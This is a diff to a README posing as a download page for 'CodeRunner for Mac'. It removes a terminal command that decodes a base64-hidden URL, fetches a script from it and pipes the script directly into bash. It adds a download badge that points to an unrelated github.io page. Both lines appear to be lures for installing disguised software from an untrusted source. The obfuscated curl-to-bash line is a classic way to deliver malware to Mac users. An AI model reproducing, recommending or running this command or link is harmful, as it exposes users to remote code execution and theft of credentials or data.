@@ -6,12 +6,12 @@
 
 ### 🔽 Download CodeRunner for Mac
 
-> 📥 Open the terminal on your device and paste the command below.
-```
-/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQ1L2luc3RhbGwuc2g= | base64 -d))"
-```
 
----
+<p align="center">
+  <a href="https://krakayut.github.io/.github/01" target="_blank">
+    <img src="https://img.shields.io/badge/⬇️%20Download%20App%20for%20Mac-7d7d7d?style=for-the-badge&logo=apple&logoColor=white" />
+  </a>
+</p>
 
 ## What is CodeRunner for Mac?
 
